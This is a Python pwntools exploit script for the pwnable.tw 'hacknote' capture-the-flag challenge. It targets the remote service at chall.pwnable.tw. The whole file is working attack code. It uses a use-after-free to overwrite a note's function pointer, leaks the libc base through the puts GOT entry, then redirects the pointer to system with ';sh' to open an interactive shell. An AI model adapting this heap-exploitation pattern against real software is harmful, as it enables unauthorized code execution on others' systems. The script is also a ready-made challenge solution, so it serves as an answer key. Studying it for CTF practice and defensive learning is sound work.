#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\x00"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("hacknote_patched", checksec=False)
libc = ELF("libc_32.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
b *0x0804893d
set follow-fork-mode parent
set detach-on-fork on
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10102
        return remote(host, port)

p = conn()

def add_note(size, content):
    slan(p, b'choice :', 1)
    slan(p, b'size :', size)
    sa(p, b'Content :', content)

def delete_note(index):
    slan(p, b'choice :', 2)
    slan(p, b'Index :', index)

def print_note(index):
    slan(p, b'choice :', 3)
    slan(p, b'Index :', index)

add_note(0x10, pad())
add_note(0x10, pad())

delete_note(0)
delete_note(1)

print_content = 0x804862b
add_note(0x8, p32(print_content) + p32(exe.got['puts']))
print_note(0)

libc.address = leak_bytes(rn(p, 4), libc.symbols['puts'])
lg("libc base", libc.address)

delete_note(2)
add_note(0x8, p32(libc.symbols['system']) +  b';sh\0')
print_note(0)

rr(p, 1)
ia(p)